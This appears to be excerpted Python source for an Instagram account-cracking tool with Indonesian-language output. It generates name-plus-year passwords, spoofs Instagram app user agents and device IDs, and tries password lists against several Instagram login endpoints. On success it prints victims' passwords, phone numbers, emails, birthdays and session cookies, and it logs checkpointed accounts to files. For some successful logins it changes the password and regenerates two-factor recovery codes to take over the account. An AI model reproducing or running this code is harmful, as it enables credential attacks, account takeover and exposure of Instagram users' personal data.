...
from rich.panel import Panel as Tobrut
from rich import print as Aku_Suka
                   ...
                   try:
                       ...
                       for self.r in self.b:
                           if len(self.r) <3:continue
                              ...
                              self.x.append(self.r.lower() + '2006')
                              self.x.append(self.r.lower() + '2016')
                              self.x.append(self.r.lower() + '2018')
                              self.x.append(self.r.lower() + '2019')
                              self.x.append(self.r.lower() + '1998')
                              self.x.append(self.r.lower() + '1999')
                           else:
...
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def AppUac(self, GoblokLu=None):
       ...
       self.kontyol = random.choice([
    'iPad6,3', 'iPhone8,4', 'iPhone10,5', 'iPhone8,1', 'iPhone8,2', 'iPhone8,3',
    'iPhone13,2', 'iPhone13,1', 'iPhone12,1', 'iPhone12,2', 'iPhone13,1', 'iPhone13,2',
    'iPhone14,1', 'iPhone14,2', 'iPhone14,5', 'iPhone15,2', 'iPhone15,1', 'iPhone16,2',
    'iPhone16,1', 'iPhone12,5', 'iPhone11,6', 'iPhone11,8', 'iPhone9,3', 'iPhone9,4',
    'iPad7,1', 'iPad7,2', 'iPad7,3', 'iPad7,4', 'iPhone6,1', 'iPhone6,2', 'iPhone5,1',
    'iPhone5,2', 'iPhone7,1', 'iPhone7,2', 'iPhone4,1', 'iPhone5,3', 'iPhone5,4',
    'iPhone6,3', 'iPhone6,4', 'iPhone7,3', 'iPhone8,5', 'iPhone8,6', 'iPhone8,7',
    'iPhone9,2', 'iPhone9,1', 'iPhone10,1', 'iPhone10,2', 'iPhone11,4', 'iPhone11,8',
    'iPhone12,3', 'iPhone12,8', 'iPhone13,3', 'iPhone13,4', 'iPhone14,4', 'iPhone14,6',
    'iPad8,1', 'iPad8,2', 'iPad8,3', 'iPad8,4', 'iPad9,1', 'iPad9,2', 'iPad9,3',
    'iPad9,4', 'iPad10,1', 'iPad10,2', 'iPad10,3', 'iPad10,4', 'iPad11,1', 'iPad11,2',
    'iPad12,1', 'iPad12,2', 'iPad13,1', 'iPad13,2', 'iPad13,4', 'iPad13,5', 'iPad14,1',
    'iPad14,2', 'iPad14,3', 'iPad14,4', 'iPhone14,7', 'iPhone14,8', 'iPhone15,3', 'iPhone15,4',
    'iPhone5,5', 'iPhone6,5', 'iPhone6,6', 'iPhone7,4', 'iPhone8,8', 'iPhone10,3', 'iPhone10,4',
    'iPhone11,2', 'iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,6', 'iPhone12,7',
    'iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone14,3', 'iPhone14,4', 'iPhone15,5', 'iPhone15,6',
    'iPad9,5', 'iPad9,6', 'iPad9,7', 'iPad9,8', 'iPad10,5', 'iPad10,6', 'iPad11,3', 'iPad11,4',
    'iPad12,3', 'iPad12,4', 'iPad13,3', 'iPad13,6', 'iPad14,5', 'iPad14,6', 'iPad15,1', 'iPad15,2',
    'iPad16,1', 'iPad16,2', 'iPhone4,2', 'iPhone4,3', 'iPhone4,4', 'iPhone4,5', 'iPhone4,6', 'iPhone5,2', 'iPhone5,3',
    'iPhone5,4', 'iPhone6,5', 'iPhone6,6', 'iPhone6,7', 'iPhone6,8', 'iPhone7,4', 'iPhone8,8',
    'iPhone10,3', 'iPhone10,4', 'iPhone11,3', 'iPhone11,4', 'iPhone12,4', 'iPhone12,7', 'iPhone13,6',
    'iPhone13,7', 'iPhone13,9', 'iPhone14,9', 'iPhone14,10', 'iPhone14,11', 'iPhone15,7',
    'iPad10,7', 'iPad10,8', 'iPad11,5', 'iPad12,5', 'iPad13,8', 'iPad13,9', 'iPad14,8', 'iPad15,5',
    'iPad16,3', 'iPad16,4', 'iPhone1,1', 'iPhone1,2', 'iPhone2,1', 'iPhone3,1', 'iPhone3,2', 'iPhone3,3', 'iPhone4,1',
    'iPhone4,2', 'iPhone5,1', 'iPhone5,2', 'iPhone5,3', 'iPhone5,4', 'iPhone6,1', 'iPhone6,2',
    'iPhone6,3', 'iPhone6,4', 'iPhone7,1', 'iPhone7,2', 'iPhone8,1', 'iPhone8,2', 'iPhone9,1',
    'iPhone9,2', 'iPhone9,3', 'iPhone9,4', 'iPhone10,1', 'iPhone10,2', 'iPhone11,1', 'iPhone11,2',
    'iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,3', 'iPhone12,4', 'iPhone12,5', 'iPhone12,8',
    'iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone13,8', 'iPhone14,3', 'iPhone14,4', 'iPhone15,7'
])

       self.apkv = f'{random.randint(100,312)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}'
       self.ua1 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; mt6765; in_ID; {self.kode})'
       self.ua2 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; qcom; es_ES; {self.kode})'
       self.ua3 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; mt6768; ru_RU; {self.kode})'
       self.ua4 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; mt6765; in_ID; {self.kode})'
       self.ua5 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; qcom; in_ID; {self.kode})'
       self.ua6 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; mt6765; ru_KZ; {self.kode})'
       self.ua7 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; {self.kontyol}; mt6765; en_US; {self.kode})'
       self.ua8 = f'Instagram {self.apkv} {self.kontyol}; iOS 11_2_5; uk_UA; uk-UA; scale=2.61; gamut=normal; {self.Ppxl})'
       return(random.choice([self.ua1, self.ua2, self.ua3, self.ua4, self.ua5, self.ua6, self.ua7, self.ua8]))
   ...
   def HeadersApiLogin(self):
       return {
          ...
          'priority': 'u=3',
          'user-agent': 'Instagram 193.0.0.45.120 Android (29/10; 480dpi; 1080x2139; HUAWEI/HONOR; HRY-LX1T; HWHRY-HF; kirin710; ru_RU; 300078998)',
             ...
             for pwb in password:
                 ...
                 if 'logged_in_user' in self.Respons.text.replace('\\',''):
                    ...
                    if True in self.UbahData:
                       ...
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Instagram Recovery
 ...
 Facebook acc : {akunfb}
 cookie       : {cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                    else:
                       Aku_Suka(Tobrut(f"""\r [bold green]status       : [bold green]Success Login
 [bold green]methode      : [bold green]Instagram Recovery
 [bold green]username     : [bold green]{info_username}
 [bold green]password     : [bold green]{pwb}
 [bold green]nomor hp     : [bold green]{info_nomor_hp}
 [bold green]email        : [bold green]{info_email}
 [bold green]birthday     : [bold green]{info_birthday}
 [bold green]Facebook acc : [bold green]{akunfb}
 [bold green]profile data : [bold green]{info_followers}/{info_following}
 [bold green]cookie       : [bold green]{cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    ...
                    #Aku_Suka(Tobrut(f"""\r [bold white]status       : [bold blue]Checkpoint
# [bold white]methode      : [bold blue]Instagram Recovery
# [bold white]username     : [bold blue]{users}
# [bold white]password     : [bold blue]{pwb}
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow"))
       ...
       try:
           for pwb in password:
               ...
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(7000,10000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
 ...
 cookie       : {cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                       ...
                       Aku_Suka(Tobrut(f"""\r
 [bold green]methode      : [bold green]Instagram Threads
 [bold green]username     : [bold green]{info_username}
 [bold green]password     : [bold green]{pwb}
 [bold green]nomor hp     : [bold green]{info_nomor_hp}
 [bold green]email        : [bold green]{info_email}
 ...
 [bold green]cookie       : [bold green]{cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    #Aku_Suka(Tobrut(f"""\r [bold white]status       : [bold blue]Checkpoint
# [bold white]methode      : [bold blue]Threads
# [bold white]username     : [bold blue]{users}
# [bold white]password     : [bold blue]{pwb}
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow"))
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
             ...
             for pwb in password:
                 ...
                 if 'logged_in_user' in self.responsIG.text.replace('\\',''):
                    ...
                    if True in self.UbahData:
                       ...
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Api Manual
 username     : {info_username}
 password     : {self.PWX}
 nomor hp     : {info_nomor_hp}
 email        : {info_email}
 ...
 cookie       : {cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                       ...
                       Aku_Suka(Tobrut(f"""\r [bold green]
 [bold green]methode      : [bold green]Api Manual
 [bold green]username     : [bold green]{info_username}
 [bold green]password     : [bold green]{pwb}
 [bold green]nomor hp     : [bold green]{info_nomor_hp}
 [bold green]email        : [bold green]{info_email}
 ...
 [bold green]cookie       : [bold green]{cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    #Aku_Suka(Tobrut(f"""\r
# [bold white]methode      : [bold blue]Api Manual
# [bold white]username     : [bold blue]{users}
# [bold white]password     : [bold blue]{pwb}
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow"))
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
           ...
           for pwb in password:
               ...
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    ...
                    if True in self.UbahData:
                       ...
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       Aku_Suka(Tobrut(f"""\r[bold green] methode      : Smartlook
 username     : {info_username}
 password     : {self.PWX}
 nomor hp     : {info_nomor_hp}
 email        : {info_email}
 ...
 cookie       : {cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                       ...
                       Aku_Suka(Tobrut(f"""\r
 [bold green]methode      : [bold green]Smartlook
 [bold green]username     : [bold green]{info_username}
 [bold green]password     : [bold green]{pwb}
 [bold green]nomor hp     : [bold green]{info_nomor_hp}
 [bold green]email        : [bold green]{info_email}
 ...
 [bold green]cookie       : [bold green]{cookie}""",title=f"[bold white][ [bold green]CABUL-LIVE[bold white]]",style=f"bold green"))
                    ...
                    followers, following, postingan = self.friends_user_chek(users)
                    #Aku_Suka(Tobrut(f"""\r
# [bold white]methode      : [bold blue]Smartlook
# [bold white]username     : [bold blue]{users}
# [bold white]password     : [bold blue]{pwb}
# [bold white]data profile : [bold blue]{followers}/{following}/{postingan}                                  """,title=f"[bold white][ [bold green]MIKU-CEPE[bold white]]",style=f"yellow"))
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
   ...
   def get_code(self, cokie, response):
       try:
           ...
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'5527890730623021'})
           ...
           head.update({
               ...
               'x-fb-lsd': 'i3vLe1aGQBwnvl37oGMXd0',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '3',
